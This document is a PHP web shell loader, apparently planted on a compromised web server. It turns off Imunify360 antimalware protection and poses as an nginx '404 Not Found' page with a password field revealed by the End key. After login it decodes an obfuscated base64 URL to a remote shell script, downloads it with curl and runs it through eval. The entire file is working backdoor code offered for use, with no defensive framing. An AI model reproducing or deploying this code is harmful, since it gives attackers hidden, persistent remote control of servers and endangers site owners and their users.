<?php
        session_start();
        error_reporting(0);
        define('SECURE_ACCESS', true);
        header('X-Powered-By: none');
        header('Content-Type: text/html; charset=UTF-8');

        ini_set('lsapi_backend_off', '1');
        ini_set("imunify360.cleanup_on_restore", false);
        ini_set("imunify360.enabled", false); 
        ini_set("imunify360.antimalware", false);
        ini_set("imunify360.realtime_protection", false);

        function geturlsinfo($url) {
        if (function_exists('curl_exec')) {$conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION['H3X4'])) {
        curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['H3X4']);
    }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    }   elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    }   else if (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    }   else {
        $url_get_contents_data = false;
    }
        return $url_get_contents_data;
    }

        function is_logged_in() {
        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
    }

        if (isset($_POST['password'])) {
            $entered_password = $_POST['password'];
            $password_hash = '$2a$12$MSKE9..73b5Es0gFqSlbGuQIP56B7FaK88F7p98VyweFlFvRT.8BK';

        if (password_verify($entered_password, $password_hash)) {
            $_SESSION['logged_in'] = true;
            $_SESSION['H3X4'] = 'R00T';
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
    }

        echo "Incorrect password. Please try again.";
    }

    if (!is_logged_in()) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head><meta charset="utf-8">

        <title>404 Not Found</title>
        </head>
        <body>
        <center><h1>404 Not Found</h1></center>
        <hr><center>nginx/1.21.3</center>

        <!-- Hidden form login with only input box -->
        <form class="hidden-form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" id="loginForm">
        <input type="password" name="password" id="password" placeholder="" required>
        </form>

        <script>
        // Form initially hidden
        document.querySelector('.hidden-form').style.display = 'none';

        document.addEventListener('keydown', function(event) {
        if (event.key === 'End') { 
        // When Home key is pressed, show the form
        document.querySelector('.hidden-form').style.display = 'block';
    }
    });
        </script>
        </body>
        </html>
        <?php
        exit;
    }

        $encoded_url1 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3d1a29uZ2V4cGxvaXQt';
        $encoded_url2 = 'Ynl0ZS9TaGVsbC9yZWZzL2hlYWRzL21haW4vaWxsdXNpb25zLWV5ZS5waHA';
        $encoded_url = $encoded_url1 . $encoded_url2;

        $url = base64_decode($encoded_url);
        $conn = curl_init();

        curl_setopt($conn, CURLOPT_URL, $url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, true);

        $code = curl_exec($conn);

        if (curl_errno($conn)) {
            die("Curl Error: " . curl_error($conn));
    }

        curl_close($conn);
        eval("?>" . $code);
        ?>